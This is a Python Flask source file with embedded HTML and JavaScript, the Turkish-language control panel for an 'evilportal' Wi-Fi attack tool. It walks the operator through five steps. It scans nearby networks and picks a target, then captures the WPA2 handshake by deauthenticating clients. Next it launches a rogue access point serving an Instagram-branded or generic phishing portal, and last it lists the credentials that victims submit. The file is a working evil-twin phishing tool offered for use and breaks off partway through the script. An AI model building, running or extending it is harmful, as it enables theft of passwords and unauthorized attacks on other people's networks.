#!/usr/bin/env python3
"""evilportal — adım adım yerel web GUI.

Çalıştır:  sudo python3 gui.py
Aç:        http://127.0.0.1:8099
"""
import csv
import glob
import json
import os
import re
import shutil
import signal
import subprocess
import tempfile
import threading

from flask import Flask, Response, jsonify, request

BASE = os.path.dirname(os.path.abspath(__file__))
CONFIG = os.path.join(BASE, "config.sh")
CREDS = os.path.join(BASE, "capture", "creds.log")
SETUP = os.path.join(BASE, "setup.sh")
AUTOPWN = os.path.join(BASE, "autopwn.sh")
PORT = 8099

LOG = []
LOG_LOCK = threading.Lock()
PROC = None
PROC_LOCK = threading.Lock()

CLOG = []
CLOG_LOCK = threading.Lock()
CPROC = None
CPROC_LOCK = threading.Lock()
CAPTURE_BSSID = ""

SCAN_LOCK = threading.Lock()

app = Flask(__name__)


# ---------------------------------------------------------------- config
def parse_value(raw: str) -> str:
    """config.sh satır değerini yorumlardan/kaçışlardan arındırarak oku."""
    raw = raw.strip()
    if not raw:
        return ""
    q = raw[0]
    if q in ("'", '"'):
        out = []
        i = 1
        while i < len(raw):
            ch = raw[i]
            if q == '"' and ch == "\\" and i + 1 < len(raw):
                out.append(raw[i + 1])
                i += 2
                continue
            if ch == q:
                break
            out.append(ch)
            i += 1
        return "".join(out)
    return raw.split("#", 1)[0].strip()


def read_config() -> dict:
    cfg = {}
    try:
        with open(CONFIG, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                cfg[k.strip()] = parse_value(v)
    except FileNotFoundError:
        pass
    return cfg


def _quote(v) -> str:
    """Değeri bash uyumlu çift tırnakla yaz ($ \" ` \\ kaçışlarıyla)."""
    s = str(v).replace("\r", " ").replace("\n", " ")
    s = (s.replace("\\", "\\\\").replace('"', '\\"')
          .replace("$", "\\$").replace("`", "\\`"))
    return f'"{s}"'


def _trailing_comment(rest: str) -> str:
    in_q = ""
    i = 0
    while i < len(rest):
        ch = rest[i]
        if in_q:
            if in_q == '"' and ch == "\\":
                i += 2
                continue
            if ch == in_q:
                in_q = ""
        elif ch in ("'", '"'):
            in_q = ch
        elif ch == "#":
            return rest[i:].strip()
        i += 1
    return ""


def write_config(vals: dict) -> None:
    with open(CONFIG, encoding="utf-8") as f:
        lines = f.read().splitlines()
    seen = set()
    for i, line in enumerate(lines):
        m = re.match(r"^([A-Z0-9_]+)=(.*)$", line)
        if not m:
            continue
        k, rest = m.group(1), m.group(2)
        if k not in vals:
            continue
        comment = _trailing_comment(rest)
        lines[i] = f"{k}={_quote(vals[k])}" + (f"  {comment}" if comment else "")
        seen.add(k)
    for k, v in vals.items():
        if k not in seen:
            lines.append(f"{k}={_quote(v)}")
    with open(CONFIG, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


# ---------------------------------------------------------------- helpers
def list_ifaces() -> list:
    names = []
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True,
                             timeout=5).stdout
        names = re.findall(r"Interface (\S+)", out)
    except Exception:
        pass
    if not names:
        try:
            out = subprocess.run(["ip", "-br", "link"], capture_output=True,
                                 text=True, timeout=5).stdout
            names = [ln.split(":")[0].strip() for ln in out.splitlines() if ln.strip()]
        except Exception:
            pass
    return [n for n in names if n]


def read_creds() -> list:
    rows = []
    if not os.path.exists(CREDS):
        return rows
    try:
        with open(CREDS, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rows.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
    except OSError:
        pass
    return rows


def pump(stream, target, lock) -> None:
    try:
        for line in iter(stream.readline, ""):
            with lock:
                target.append(line.rstrip())
                del target[:-500]
    finally:
        try:
            stream.close()
        except Exception:
            pass


def _int(v) -> int:
    try:
        return int(v)
    except Exception:
        return -999


def is_running(proc, lock) -> bool:
    with lock:
        return proc is not None and proc.poll() is None


BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


def validate_target(cfg: dict) -> str | None:
    """Başlatma/kırma öncesi doğrulama. Hata metni veya None döner."""
    ssid = (cfg.get("TARGET_SSID") or "").strip()
    if not ssid:
        return "SSID boş — hedef ağ seç"
    if len(ssid.encode("utf-8")) > 32:
        return "SSID 32 bayttan uzun"
    bssid = (cfg.get("TARGET_BSSID") or "").strip()
    if not BSSID_RE.match(bssid):
        return "BSSID geçersiz (AA:BB:CC:DD:EE:FF)"
    ch = (cfg.get("CHANNEL") or "").strip()
    if not ch.isdigit() or not 1 <= int(ch) <= 196:
        return "kanal 1-196 arası olmalı"
    pw = cfg.get("WPA_PASS") or ""
    if pw and not 8 <= len(pw) <= 63:
        return "WPA2 parolası 8-63 karakter olmalı"
    if not (cfg.get("MON_IF") or "").strip():
        return "monitor arayüzü seçilmedi"
    if not (cfg.get("AP_IF") or "").strip():
        return "AP arayüzü seçilmedi"
    if cfg.get("SINGLE_ADAPTER") != "1" and cfg.get("MON_IF") == cfg.get("AP_IF"):
        return "MON_IF ve AP_IF aynı — tek adaptör modunu aç"
    return None


# ---------------------------------------------------------------- scan
def scan_aps(iface: str, seconds: int = 15) -> dict:
    if not iface:
        return {"ok": False, "error": "arayüz seçilmedi"}
    if not SCAN_LOCK.acquire(blocking=False):
        return {"ok": False, "error": "tarama zaten sürüyor"}
    work = tempfile.mkdtemp(prefix="epscan_")
    base = os.path.join(work, "scan")
    try:
        try:
            subprocess.run(["airmon-ng", "check", "kill"],
                           capture_output=True, timeout=15)
        except Exception:
            pass
        for cmd in (["ip", "link", "set", iface, "down"],
                    ["iw", "dev", iface, "set", "type", "monitor"],
                    ["ip", "link", "set", iface, "up"]):
            try:
                subprocess.run(cmd, capture_output=True, timeout=8)
            except Exception as exc:
                return {"ok": False, "error": f"monitor mode: {exc}"}

        try:
            info = subprocess.run(["iw", "dev", iface, "info"],
                                  capture_output=True, text=True,
                                  timeout=8).stdout
        except Exception:
            info = ""
        if "type monitor" not in info:
            return {"ok": False,
                    "error": f"{iface} monitor mode'a alınamadı (kart desteklemiyor?)"}

        err_path = os.path.join(work, "airodump.err")
        errf = None
        try:
            errf = open(err_path, "wb")
        except OSError:
            pass
        try:
            proc = subprocess.Popen(
                ["airodump-ng", "--band", "abg", "--output-format", "csv",
                 "-w", base, iface],
                stdout=subprocess.DEVNULL,
                stderr=errf if errf is not None else subprocess.DEVNULL,
            )
        except FileNotFoundError:
            return {"ok": False, "error": "airodump-ng bulunamadı"}
        except Exception as exc:
            return {"ok": False, "error": str(exc)}
        finally:
            if errf is not None:
                errf.close()

        try:
            proc.wait(timeout=seconds)
        except subprocess.TimeoutExpired:
            # SIGTERM: airodump csv'yi diske yazıp kapanır (SIGKILL veri kaybettirir)
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    pass

        csv_path = None
        for cand in glob.glob(base + "-*.csv"):
            csv_path = cand
            break

        aps = []
        if csv_path and os.path.exists(csv_path):
            with open(csv_path, newline="", errors="replace") as f:
                reader = csv.reader(f)
                in_ap = False
                for row in reader:
                    if not row:
                        continue
                    first = row[0].strip()
                    if first == "BSSID":
                        in_ap = True
                        continue
                    if first == "Station MAC":
                        in_ap = False
                        continue
                    if not in_ap:
                        continue
                    if not first:
                        in_ap = False
                        continue
                    if len(row) < 14:
                        continue
                    aps.append({
                        "bssid": first,
                        "channel": row[3].strip(),
                        "privacy": row[5].strip(),
                        "cipher": row[6].strip(),
                        "power": row[8].strip(),
                        "essid": row[13].strip() or "(gizli)",
                    })
        aps.sort(key=lambda a: _int(a["power"]))
        if not aps:
            err_tail = ""
            try:
                with open(err_path, "r", errors="replace") as f:
                    tail = [ln.strip() for ln in f if ln.strip()]
                err_tail = tail[-1] if tail else ""
            except OSError:
                pass
            if err_tail:
                return {"ok": False, "error": f"airodump-ng: {err_tail}"}
        return {"ok": True, "aps": aps}
    finally:
        # monitor modundan çık, uplink'i geri getir
        for cmd in (["ip", "link", "set", iface, "down"],
                    ["iw", "dev", iface, "set", "type", "managed"],
                    ["ip", "link", "set", iface, "up"],
                    ["systemctl", "restart", "NetworkManager"]):
            try:
                subprocess.run(cmd, capture_output=True, timeout=20)
            except Exception:
                pass
        shutil.rmtree(work, ignore_errors=True)
        SCAN_LOCK.release()


# ---------------------------------------------------------------- api
@app.get("/api/interfaces")
def api_interfaces():
    return jsonify(ifaces=list_ifaces())


CONFIG_KEYS = (
    "MON_IF", "AP_IF", "UPLINK_IF", "SINGLE_ADAPTER",
    "TARGET_SSID", "TARGET_BSSID", "CHANNEL", "WPA_PASS",
    "PORTAL_TEMPLATE", "BRAND", "SUCCESS_URL", "SHARE_INTERNET",
    "CAPTURE_TIMEOUT",
)


@app.get("/api/config")
def api_config_get():
    cfg = read_config()
    return jsonify({k: cfg.get(k) for k in CONFIG_KEYS})


@app.post("/api/config")
def api_config_set():
    vals = request.get_json(silent=True) or {}
    write_config(vals)
    return jsonify(ok=True)


@app.post("/api/scan")
def api_scan():
    if is_running(PROC, PROC_LOCK):
        return jsonify(ok=False, error="oturum çalışırken taranamaz"), 400
    if is_running(CPROC, CPROC_LOCK):
        return jsonify(ok=False, error="yakalama çalışırken taranamaz"), 400
    body = request.get_json(silent=True) or {}
    iface = body.get("iface") or read_config().get("MON_IF", "")
    try:
        seconds = int(body.get("seconds") or 15)
    except (TypeError, ValueError):
        seconds = 15
    return jsonify(scan_aps(iface, max(5, min(seconds, 60))))


@app.post("/api/capture")
def api_capture():
    global CPROC, CAPTURE_BSSID
    if is_running(PROC, PROC_LOCK):
        return jsonify(ok=False, error="oturum çalışırken yakalanamaz"), 400
    with CPROC_LOCK:
        if CPROC is not None and CPROC.poll() is None:
            return jsonify(ok=False, error="yakalama zaten çalışıyor"), 400
        vals = request.get_json(silent=True) or {}
        if vals:
            write_config({k: vals[k] for k in (
                "MON_IF", "TARGET_SSID", "TARGET_BSSID", "CHANNEL",
                "CAPTURE_TIMEOUT",
            ) if k in vals})
        cfg = read_config()
        problem = validate_target(cfg)
        if problem:
            return jsonify(ok=False, error=problem), 400
        CAPTURE_BSSID = (cfg.get("TARGET_BSSID") or "").strip().upper()
        with CLOG_LOCK:
            CLOG.clear()
        CPROC = subprocess.Popen(
            ["bash", AUTOPWN],
            cwd=BASE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, preexec_fn=os.setsid,
        )
        threading.Thread(target=pump, args=(CPROC.stdout, CLOG, CLOG_LOCK),
                         daemon=True).start()
    return jsonify(ok=True)


@app.post("/api/capture/stop")
def api_capture_stop():
    global CPROC
    with CPROC_LOCK:
        if CPROC is None or CPROC.poll() is not None:
            return jsonify(ok=True)
        try:
            os.killpg(os.getpgid(CPROC.pid), signal.SIGINT)
            CPROC.wait(timeout=15)
        except Exception:
            try:
                os.killpg(os.getpgid(CPROC.pid), signal.SIGKILL)
            except Exception:
                pass
    return jsonify(ok=True)


@app.get("/api/capture/status")
def api_capture_status():
    with CLOG_LOCK:
        tail = CLOG[-140:]
    return jsonify(running=is_running(CPROC, CPROC_LOCK),
                   log=tail, bssid=CAPTURE_BSSID)


@app.post("/api/start")
def api_start():
    global PROC
    if is_running(CPROC, CPROC_LOCK):
        return jsonify(ok=False, error="yakalama sürüyor — önce durdur"), 400
    with PROC_LOCK:
        if PROC is not None and PROC.poll() is None:
            return jsonify(ok=False, error="zaten çalışıyor"), 400
        vals = request.get_json(silent=True) or {}
        if vals:
            write_config(vals)
        problem = validate_target(read_config())
        if problem:
            return jsonify(ok=False, error=problem), 400
        with LOG_LOCK:
            LOG.clear()
        PROC = subprocess.Popen(
            ["bash", SETUP],
            cwd=BASE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, preexec_fn=os.setsid,
        )
        threading.Thread(target=pump, args=(PROC.stdout, LOG, LOG_LOCK),
                         daemon=True).start()
    return jsonify(ok=True)


@app.post("/api/stop")
def api_stop():
    global PROC
    with PROC_LOCK:
        if PROC is None or PROC.poll() is not None:
            return jsonify(ok=True, message="çalışmıyor")
        try:
            os.killpg(os.getpgid(PROC.pid), signal.SIGINT)
            PROC.wait(timeout=45)
        except Exception:
            try:
                os.killpg(os.getpgid(PROC.pid), signal.SIGKILL)
            except Exception:
                pass
    return jsonify(ok=True)


@app.get("/api/status")
def api_status():
    with LOG_LOCK:
        tail = LOG[-160:]
    rows = read_creds()
    return jsonify(running=is_running(PROC, PROC_LOCK), log=tail,
                   creds=rows[-80:], count=len(rows))


@app.get("/preview/<name>")
def preview(name):
    if not re.fullmatch(r"[a-z0-9_]+", name):
        return "yok", 404
    path = os.path.join(BASE, "portal", "templates", f"{name}.html")
    if not os.path.exists(path):
        return "yok", 404
    with open(path, encoding="utf-8") as f:
        html = f.read()
    html = html.replace("{{ brand }}", "Instagram")
    html = html.replace("{{ target }}", "https://www.instagram.com/")
    return Response(html, mimetype="text/html")


@app.get("/")
def index():
    return Response(HTML, mimetype="text/html")


# ---------------------------------------------------------------- html
HTML = r"""<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>evilportal</title>
<style>
  :root{
    --bg:#0a0e17; --panel:#111827; --panel2:#0d1422; --line:#1f2a3d;
    --txt:#e6edf9; --dim:#8595b0; --acc:#e1306c; --acc2:#f77737;
    --ok:#2ecc71; --bad:#ff5c5c; --warn:#f5c542;
    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  }
  *{box-sizing:border-box}
  body{
    margin:0;min-height:100vh;background:
      radial-gradient(900px 420px at 50% -240px,#1b2740 0%,transparent 70%),
      var(--bg);
    color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
    padding:18px;
  }
  .shell{max-width:900px;margin:0 auto}
  header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
  .brand{font-size:19px;font-weight:800;letter-spacing:-.3px;display:flex;align-items:center;gap:9px}
  .brand i{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;
    font-style:normal;font-size:15px;background:linear-gradient(135deg,var(--acc),var(--acc2))}
  .pill{padding:6px 13px;border-radius:999px;font-size:12px;font-weight:700;
    border:1px solid var(--line);color:var(--dim);background:var(--panel);white-space:nowrap}
  .pill.on{color:#0b0f19;background:var(--ok);border-color:var(--ok)}
  nav.steps{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:14px}
  .step{display:flex;align-items:center;gap:8px;padding:10px 11px;border-radius:12px;
    background:var(--panel);border:1px solid var(--line);font-size:12.5px;color:var(--dim);
    cursor:pointer;user-select:none;transition:.15s}
  .step b{width:21px;height:21px;border-radius:7px;display:grid;place-items:center;
    font-size:11.5px;background:#1b2434;color:var(--dim);flex:0 0 auto}
  .step.act{border-color:#3a4a68;color:var(--txt)}
  .step.act b{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
  .step.done b{background:var(--ok);color:#0b0f19}
  main{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:22px}
  .pane{display:none}
  .pane.on{display:block}
  h2{margin:0 0 4px;font-size:16px}
  .hint{color:var(--dim);font-size:13px;margin:0 0 16px;line-height:1.55}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:13px}
  @media(max-width:720px){.grid{grid-template-columns:1fr}nav.steps{grid-template-columns:1fr 1fr}}
  label{display:block;font-size:11.5px;color:var(--dim);margin-bottom:6px;
    text-transform:uppercase;letter-spacing:.05em;font-weight:700}
  input,select{width:100%;padding:11px 12px;border-radius:10px;border:1px solid var(--line);
    background:var(--panel2);color:var(--txt);font-size:14px;outline:none}
  input:focus,select:focus{border-color:var(--acc)}
  .field{margin-bottom:13px}
  .check{display:flex;align-items:center;gap:9px;padding:11px 12px;border-radius:10px;
    border:1px solid var(--line);background:var(--panel2);margin-bottom:13px;font-size:13.5px}
  .check input{width:17px;height:17px;accent-color:var(--acc);flex:0 0 auto}
  .nav{display:flex;justify-content:space-between;gap:10px;margin-top:18px}
  button{padding:11px 20px;border:0;border-radius:10px;cursor:pointer;font-size:14px;
    font-weight:700;background:#1b2434;color:var(--txt);transition:.15s}
  button:disabled{opacity:.4;cursor:not-allowed}
  button.primary{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
  button.go{background:var(--ok);color:#0b0f19}
  button.stop{background:var(--bad);color:#fff}
  button.ghost{background:transparent;border:1px solid var(--line);color:var(--dim)}
  button.small{padding:8px 14px;font-size:13px}
  .summary{background:var(--panel2);border:1px solid var(--line);border-radius:12px;
    padding:14px;font-family:var(--mono);font-size:12.5px;line-height:1.75;color:var(--dim);
    white-space:pre-wrap;margin-bottom:14px}
  .summary b{color:var(--txt);font-weight:600}
  pre.log{background:#060a12;border:1px solid var(--line);border-radius:12px;padding:12px;
    height:200px;overflow:auto;font-family:var(--mono);font-size:12px;line-height:1.55;
    color:#9fb2cd;white-space:pre-wrap;margin:12px 0 0}
  pre.log .ok{color:#6ee7a0}
  pre.log .err{color:#ff8a8a}
  .errbox{margin:10px 0 0;padding:10px 13px;border-radius:10px;font-size:13px;
    background:rgba(255,92,92,.1);border:1px solid rgba(255,92,92,.4);
    color:#ffb3b3;display:none}
  .errbox.on{display:block}
  table{width:100%;border-collapse:collapse;font-size:13px;margin-top:6px}
  th{text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.05em;
    color:var(--dim);padding:8px 10px;border-bottom:1px solid var(--line)}
  td{padding:9px 10px;border-bottom:1px solid #161f2e;vertical-align:top}
  td.p{color:#ffb3b4;font-family:var(--mono)}
  .empty{color:var(--dim);font-size:13px;padding:18px 0;text-align:center}
  .count{font-size:12px;color:var(--dim);margin-left:8px}
  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  footer{margin-top:14px;text-align:center;font-size:11.5px;color:#5b6b85}
  code{font-family:var(--mono);background:#0d1422;padding:1px 6px;border-radius:5px}
  .aplist{border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-bottom:14px}
  .aplist .head,.ap{display:grid;grid-template-columns:26px 1.4fr 1.6fr .5fr .7fr;gap:8px;
    align-items:center;padding:9px 12px;font-size:12.5px}
  .aplist .head{color:var(--dim);font-size:10.5px;text-transform:uppercase;
    letter-spacing:.06em;background:var(--panel2);border-bottom:1px solid var(--line)}
  .ap{border-bottom:1px solid #161f2e;cursor:pointer;transition:.12s}
  .ap:last-child{border-bottom:0}
  .ap:hover{background:#141d2e}
  .ap.sel{background:rgba(225,48,108,.12)}
  .ap .sig{display:flex;gap:2px;align-items:flex-end;height:12px}
  .ap .sig i{width:3px;background:#31405c;border-radius:1px}
  .ap .sig i.on{background:var(--ok)}
  .ap .ssid{font-weight:600;color:var(--txt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .ap .bssid{font-family:var(--mono);font-size:11.5px;color:var(--dim)}
  .ap .ch{color:var(--dim)}
  .ap .sec{font-size:11px;color:var(--warn)}
</style>
</head>
<body>
<div class="shell">
  <header>
    <div class="brand"><i>◎</i> evilportal</div>
    <div class="pill" id="pill">durdu</div>
  </header>

  <nav class="steps" id="steps">
    <div class="step" data-s="1"><b>1</b> Arayüz</div>
    <div class="step" data-s="2"><b>2</b> Hedef</div>
    <div class="step" data-s="3"><b>3</b> Kır</div>
    <div class="step" data-s="4"><b>4</b> Başlat</div>
    <div class="step" data-s="5"><b>5</b> Kayıtlar</div>
  </nav>

  <main>
    <!-- 1 -->
    <section class="pane on" data-s="1">
      <h2>Adaptörler</h2>
      <p class="hint">Deauth ve handshake için monitor mode destekli kart, sahte AP için
        ikinci kart. Tek kartla deneyeceksen aşağıdaki seçeneği işaretle.</p>
      <div class="grid">
        <div class="field"><label>Monitor arayüzü (deauth / tarama)</label>
          <select id="MON_IF"></select></div>
        <div class="field"><label>AP arayüzü (sahte ağ)</label>
          <select id="AP_IF"></select></div>
        <div class="field"><label>Uplink (internet)</label>
          <select id="UPLINK_IF"><option value="">otomatik</option></select></div>
        <div class="field"><label>&nbsp;</label>
          <label class="check"><input type="checkbox" id="SINGLE_ADAPTER"> Tek adaptör modu</label>
        </div>
      </div>
      <div class="nav">
        <span></span>
        <button class="primary" onclick="go(2)">İleri →</button>
      </div>
    </section>

    <!-- 2 -->
    <section class="pane" data-s="2">
      <h2>Hedef ağ</h2>
      <p class="hint">“Tara” monitor kartla 15 sn tarar. Listeden bir ağ seç, alanlar
        otomatik dolar. Tarama NetworkManager'ı durdurur.</p>
      <div class="row" style="margin-bottom:12px">
        <button class="ghost small" id="btnScan" onclick="scan()">⟳ Tara</button>
        <span class="hint" id="scanInfo" style="margin:0"></span>
      </div>
      <div class="aplist" id="apList">
        <div class="head"><span></span><span>SSID</span><span>BSSID</span><span>CH</span><span>SİNYAL</span></div>
        <div class="empty">henüz tarama yok</div>
      </div>

      <div class="grid">
        <div class="field"><label>SSID</label>
          <input id="TARGET_SSID" placeholder="KafeWiFi"></div>
        <div class="field"><label>BSSID</label>
          <input id="TARGET_BSSID" placeholder="AA:BB:CC:DD:EE:FF"></div>
        <div class="field"><label>Kanal</label>
          <input id="CHANNEL" type="number" min="1" max="196" placeholder="6"></div>
        <div class="field"><label>WPA2 parolası (varsa)</label>
          <input id="WPA_PASS" placeholder="boş = açık ağ"></div>
        <div class="field"><label>Portal sayfası</label>
          <select id="PORTAL_TEMPLATE">
            <option value="instagram">Instagram — şüpheli aktivite</option>
            <option value="verify">Genel — hesap doğrulama</option>
          </select></div>
        <div class="field"><label>Doğrulama sonrası yönlendirme</label>
          <input id="SUCCESS_URL" placeholder="https://www.google.com"></div>
      </div>
      <label class="check"><input type="checkbox" id="SHARE_INTERNET">
        Doğrulama sonrası gerçek internet ver</label>
      <div class="row"><button class="ghost small" onclick="preview()">Portalı önizle</button></div>
      <div class="nav">
        <button onclick="go(1)">← Geri</button>
        <button class="primary" onclick="go(3)">İleri →</button>
      </div>
    </section>

    <!-- 3 -->
    <section class="pane" data-s="3">
      <h2>Handshake yakalama</h2>
      <p class="hint">Hedef WPA2-PSK ise bu adım 4-way handshake'i yakalayıp
        capture/ klasörüne .cap olarak kaydeder. Parolayı kendin biliyorsan
        doğrudan WPA parolası alanına yaz; açık ağlarda bu adımı atla.</p>
      <div class="grid">
        <div class="field"><label>Handshake zaman aşımı (sn)</label>
          <input id="CAPTURE_TIMEOUT" type="number" min="10" max="600" placeholder="60"></div>
      </div>
      <div class="row">
        <button class="primary" id="btnCrack" onclick="crack()">📡 Handshake yakala</button>
        <button class="stop" id="btnCrackStop" onclick="crackStop()" disabled>■ Durdur</button>
      </div>
      <div class="errbox" id="captureErrBox"></div>
      <pre class="log" id="crackLog">hazır.</pre>
      <div class="nav">
        <button onclick="go(2)">← Geri</button>
        <button class="primary" onclick="go(4)">İleri →</button>
      </div>
    </section>

    <!-- 4 -->
    <section class="pane" data-s="4">
      <h2>Başlat</h2>
      <p class="hint">Ayarlar <code>config.sh</code>'e yazılır ve sistem ayağa kaldırılır.
        Durdurduğunda iptables, hostapd, dnsmasq ve NetworkManager geri alınır.</p>
      <div class="summary" id="summary"></div>
      <div class="row">
        <button class="go" id="btnStart" onclick="start()">▶ Başlat</button>
        <button class="stop" id="btnStop" onclick="stop()" disabled>■ Durdur</button>
      </div>
      <div class="errbox" id="startErrBox"></div>
      <pre class="log" id="log">hazır.</pre>
      <div class="nav">
        <button onclick="go(3)">← Geri</button>
        <button class="primary" onclick="go(5)">Kayıtlar →</button>
      </div>
    </section>

    <!-- 5 -->
    <section class="pane" data-s="5">
      <h2>Yakalananlar <span class="count" id="count">0</span></h2>
      <p class="hint">Form gönderen istemcilerin bilgileri. Kayıtlar
        <code>capture/creds.log</code> dosyasında JSON satırları olarak tutulur.</p>
      <div id="creds"><div class="empty">henüz kayıt yok</div></div>
      <div class="nav">
        <button onclick="go(4)">← Geri</button>
        <span></span>
      </div>
    </section>
  </main>

  <footer>127.0.0.1:8099 · yerel yönetim paneli</footer>
</div>

<script>
const $ = id => document.getElementById(id);
let step = 1, running = false, crackStarted = false, aps = [], lastBssid = "";

const FIELDS = ["MON_IF","AP_IF","UPLINK_IF","TARGET_SSID","TARGET_BSSID",
                "CHANNEL","WPA_PASS","PORTAL_TEMPLATE","SUCCESS_URL",
                "CAPTURE_TIMEOUT"];

function go(n){
  step = n;
  document.querySelectorAll(".pane").forEach(p =>
    p.classList.toggle("on", +p.dataset.s === n));
  document.querySelectorAll(".step").forEach(s => {
    const v = +s.dataset.s;
    s.classList.toggle("act", v === n);
    s.classList.toggle("done", v < n);
  });
  if (n === 4) refreshSummary();
  if (n === 5) poll();
}

function collect(){
  const o = {};
  FIELDS.forEach(k => { const el = $(k); if (el) o[k] = el.value.trim(); });
  o.SINGLE_ADAPTER = $("SINGLE_ADAPTER").checked ? "1" : "0";
  o.SHARE_INTERNET = $("SHARE_INTERNET").checked ? "1" : "0";
  return o;
}

function refreshSummary(){
  const o = collect();
  $("summary").innerHTML =
    "<b>SSID</b>      " + (o.TARGET_SSID || "—") + "\n" +
    "<b>BSSID</b>     " + (o.TARGET_BSSID || "—") + "\n" +
    "<b>Kanal</b>     " + (o.CHANNEL || "—") + "\n" +
    "<b>WPA</b>       " + (o.WPA_PASS ? "var" : "yok (açık)") + "\n" +
    "<b>Monitor</b>   " + (o.MON_IF || "—") + "\n" +
    "<b>AP</b>        " + (o.AP_IF || "—") + "\n" +
    "<b>Portal</b>    " + (o.PORTAL_TEMPLATE || "—") + "\n" +
    "<b>İnternet</b>  " + (o.SHARE_INTERNET === "1" ? "açık" : "kapalı");
}

async function load(){
  const [ifs, cfg] = await Promise.all([
    fetch("/api/interfaces").then(r => r.json()),
    fetch("/api/config").then(r => r.json())
  ]);
  const list = ifs.ifaces || [];
  ["MON_IF","AP_IF","UPLINK_IF"].forEach(id => {
    const sel = $(id);
    sel.innerHTML = id === "UPLINK_IF" ? '<option value="">otomatik</option>' : "";
    list.forEach(n => {
      const o = document.createElement("option");
      o.value = o.textContent = n;
      sel.appendChild(o);
    });
  });
  FIELDS.forEach(k => {
    const el = $(k);
    if (el && cfg[k] !== undefined && cfg[k] !== null && cfg[k] !== "")
      el.value = cfg[k];
  });
  $("SINGLE_ADAPTER").checked = cfg.SINGLE_ADAPTER === "1";
  $("SHARE_INTERNET").checked = cfg.SHARE_INTERNET !== "0";
}

/* ---------- tarama ---------- */
function sigBars(power){
  const p = parseInt(power, 10);
  let n = 1;
  if (p >= -50) n = 5; else if (p >= -60) n = 4;
  else if (p >= -70) n = 3; else if (p >= -80) n = 2;
  let h = "";
  for (let i = 1; i <= 5; i++) h += '<i class="' + (i <= n ? "on" : "") + '"></i>';
  return '<span class="sig">' + h + '</span>';
}

function renderAps(list){
  aps = list || [];
  const el = $("apList");
  if (!aps.length){
    el.innerHTML = '<div class="head"><span></span><span>SSID</span><span>BSSID</span><span>CH</span><span>SİNYAL</span></div><div class="empty">ağ bulunamadı</div>';
    return;
  }
  let h = '<div class="head"><span></span><span>SSID</span><span>BSSID</span><span>CH</span><span>SİNYAL</span></div>';
  aps.forEach((a, i) => {
    h += '<div class="ap" data-i="' + i + '">' +
         '<span>' + (a.privacy && a.privacy.includes("WPA") ? "🔒" : "🔓") + '</span>' +
         '<span class="ssid">' + esc(a.essid) + '</span>' +
         '<span class="bssid">' + esc(a.bssid) + '</span>' +
         '<span class="ch">' + esc(a.channel) + '</span>' +
         '<span>' + sigBars(a.power) + '</span></div>';
  });
  el.innerHTML = h;
  el.querySelectorAll(".ap").forEach(row =>
    row.addEventListener("click", () => selectAp(+row.dataset.i, row)));
}

function selectAp(i, row){
  const a = aps[i];
  if (!a) return;
  if (lastBssid && lastBssid !== a.bssid){
    $("WPA_PASS").value = "";
    crackStarted = false;
  }
  lastBssid = a.bssid;
  $("TARGET_SSID").value = a.essid === "(gizli)" ? "" : a.essid;
  $("TARGET_BSSID").value = a.bssid;
  $("CHANNEL").value = a.channel;
  document.querySelectorAll("#apList .ap").forEach(r => r.classList.remove("sel"));
  row.classList.add("sel");
  $("scanInfo").textContent = a.privacy + " · " + (a.cipher || "") + " · " + a.power + " dBm";
}

async function scan(){
  const btn = $("btnScan");
  btn.disabled = true; btn.textContent = "taranıyor…";
  $("apList").innerHTML = '<div class="empty">15 sn taranıyor…</div>';
  const r = await fetch("/api/scan", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({iface: $("MON_IF").value, seconds: 15})
  }).then(r => r.json()).catch(e => ({ok:false, error:String(e)}));
  btn.disabled = false; btn.textContent = "⟳ Tara";
  if (!r.ok){ $("apList").innerHTML = '<div class="empty">' + esc(r.error || "hata") + '</div>'; return; }
  renderAps(r.aps);
  $("scanInfo").textContent = (r.aps || []).length + " ağ";
}

/* ---------- handshake yakalama ---------- */
async function crack(){
  crackStarted = true;
  $("btnCrack").disabled = true;
  clearErr("captureErrBox");
  $("crackLog").textContent = "başlatılıyor…\n";
  const r = await fetch("/api/capture", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify(collect())
  }).then(r => r.json()).catch(e => ({ok:false, error:String(e)}));
  if (!r.ok){
    crackStarted = false;
    $("btnCrack").disabled = false;
    showErr("captureErrBox", r.error || "bilinmiyor");
    return;
  }
  pollCrack();
}

async function crackStop(){
  $("btnCrackStop").disabled = true;
  await fetch("/api/capture/stop", {method:"POST"});
  pollCrack();
}

async function pollCrack(){
  const s = await fetch("/api/capture/status").then(r => r.json()).catch(() => null);
  if (!s) return;
  $("btnCrack").disabled = !!s.running;
  $("btnCrackStop").disabled = !s.running;
  const el = $("crackLog");
  const atBottom = el.scrollTop + el.clientHeight >= el.scrollHeight - 30;
